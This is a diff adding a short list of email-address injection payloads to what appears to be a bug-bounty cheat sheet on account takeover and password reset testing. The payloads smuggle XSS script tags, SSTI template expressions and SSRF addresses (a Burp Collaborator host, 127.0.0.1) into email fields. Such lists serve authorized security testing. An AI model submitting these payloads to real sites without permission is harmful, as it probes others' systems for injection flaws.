@@ -44,3 +44,20 @@ Url encode and unicode normalization including raw format. Great for ATO, check 
                                                  ** Password Reset:**
 
 <img src="https://pbs.twimg.com/media/FiRgcuUacAAUpKJ?format=jpg&name=large" alt="Alt text" title="Optional title">
+
+
+**Payloads for xss,SSTI,SSRF:**
+
+1. test+(<script>alert(0)</script>)@example.com
+2. test@example(<script>alert(0)</script>).com
+3. "<script>alert(0)</script>"@example.com
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+
+SSTI template injection:
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+
+SSRF:
+john.doe@abc123.burpcollaborator.net
+john.doe@[127.0.0.1]
